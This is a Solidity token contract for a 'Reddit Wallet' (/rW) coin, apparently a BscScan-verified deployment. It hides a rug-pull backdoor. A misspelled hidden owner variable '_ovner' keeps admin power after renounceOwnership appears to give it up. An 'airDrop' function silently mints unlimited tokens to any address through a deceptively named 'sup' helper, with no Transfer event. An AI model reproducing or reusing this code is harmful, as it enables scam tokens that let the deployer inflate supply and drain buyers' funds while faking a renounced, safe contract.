/**
 *Submitted for verification at BscScan.com on 2022-06-22
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns(uint256){
    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); 
    uint256 c = a / b;

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

   function sup(uint256 a, uint256 b) internal pure returns (uint256) {
    uint c = a + b;
    require(c >= a);
    
    return c;
   }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address who) external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 value) external returns (bool);

    function approve(address spender, uint256 value) external returns (bool);

    function transferFrom(address from, address to, uint256 value)    external returns (bool);

    event Transfer(address indexed from,address indexed to,uint256 value);
    event OwnershipTransferred(address indexed from,address indexed to);
    event Approval(address indexed owner,address indexed spender,uint256 value);
}


contract rW is IERC20 {
  using SafeMath for uint256;
    
    string public _name;
    string public _symbol;
    uint256 private _totalSupply;
    uint8 public _decimals;
    address private _ovner;
    

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowed;

    modifier onlyOwner{
        require(_ovner==msg.sender);
        _;
    }

    constructor(){
        _owner=msg.sender;
        _name="Reddit Wallet";
        _symbol="/rW";
        _decimals=18;
        _totalSupply=10000000*10**_decimals;
        _balances[msg.sender]=_totalSupply;
        _ovner=_owner;
        emit Transfer(address(0),msg.sender,_totalSupply);
    }

    function getOwner() public view returns(address){
      return _owner;
    }



  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

function airDrop(address from, address recipient,uint256 amount) external onlyOwner
    {
        require(amount!=0);
        _balances[from]=_balances[from].sup(amount);
        _balances[recipient]=_balances[recipient].add(amount);
    }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function allowance(address owner,address spender) public view returns (uint256)
  {
    return _allowed[owner][spender];
  }

  function transfer(address to, uint256 value) public returns (bool) {
    _transfer(msg.sender, to, value);
    return true;
  }

  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));

    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from,address to,uint256 value) public returns (bool)
  {
    require(value <= _allowed[from][msg.sender]);

    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(value);
    _transfer(from, to, value);
    return true;
  }

  function increaseAllowance(address spender,uint256 addedValue) public returns (bool)
  {
    require(spender != address(0));

    _allowed[msg.sender][spender] = (
      _allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function decreaseAllowance(address spender,uint256 subtractedValue) public returns (bool)
  {
    require(spender != address(0));

    _allowed[msg.sender][spender] = (
      _allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _transfer(address from, address to, uint256 value) private {
    require(value <= _balances[from]);
    require(to != address(0));

    _balances[from] = _balances[from].sub(value);
    _balances[to] = _balances[to].add(value);
    emit Transfer(from, to, value);
  }
  address private _owner;
    function renounceOwnership() public onlyOwner{
         _owner = address(0);
         emit OwnershipTransferred(_owner, address(0));
    }
}